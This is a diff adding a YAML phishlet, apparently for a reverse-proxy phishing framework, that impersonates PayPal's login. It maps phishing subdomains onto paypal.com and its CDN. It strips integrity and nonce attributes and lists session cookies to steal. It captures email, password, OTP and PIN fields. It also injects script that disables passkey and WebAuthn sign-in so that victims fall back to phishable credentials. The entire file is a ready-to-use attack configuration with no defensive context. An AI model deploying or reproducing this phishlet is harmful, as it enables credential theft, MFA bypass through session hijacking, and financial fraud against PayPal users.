@@ -1,0 +1,72 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  - {phish_sub: 'paypal', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
+  # paypalobjects.com — static CDN for JS/CSS bundles
+  - {phish_sub: 'paypalobj', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false, auto_filter: true}
+  # checkout.paypal.com — post-login checkout flows
+  - {phish_sub: 'ppcheckout', orig_sub: 'checkout', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypalobjects.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'checkout', domain: 'paypal.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.paypal.com'
+    keys: ['cookie_check', 'l7_az,opt', 'ts,opt', 'tsrce,opt', 'enforce_policy,opt', 'x-csrf-jwt,opt', 'akavpau_ppsd,opt', 'IDSESSION,opt', 'X-PP-SILOVER,opt', 'KHcl0EuY7JNQM6oy3,opt', 'nsid,opt', 'tcs_auth,opt', 'prm,opt']
+    type: 'cookie'
+
+credentials:
+  # PayPal two-step: email submitted first, password on second page
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # Alternative field names used in some PayPal flows
+    - {key: 'email', search: '(.*)', type: 'post'}
+    - {key: 'password', search: '(.*)', type: 'post'}
+    # OTP / 2FA code
+    - {key: 'otpcode', search: '(.*)', type: 'post'}
+    - {key: 'pin', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/authservice/auth/UI/signin'
+  - '/signin/'
+  - '/myaccount/home'
+  - '/myaccount/summary'
+  - '/webapps/mpp/home'
+
+js_inject:
+  - trigger_domains: ['www.paypal.com']
+    trigger_paths: ['/signin.*', '/authservice.*']
+    script: |
+      (function(){
+        if(window.PublicKeyCredential){
+          window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){return Promise.resolve(false);};
+          window.PublicKeyCredential.isConditionalMediationAvailable=function(){return Promise.resolve(false);};
+        }
+        if(navigator.credentials&&navigator.credentials.get){
+          var _orig=navigator.credentials.get.bind(navigator.credentials);
+          navigator.credentials.get=function(o){
+            if(o&&o.publicKey)return Promise.reject(new DOMException('Not allowed','NotAllowedError'));
+            return _orig(o);
+          };
+        }
+      })();
+
+login:
+  domain: 'www.paypal.com'
+  path: '/signin'
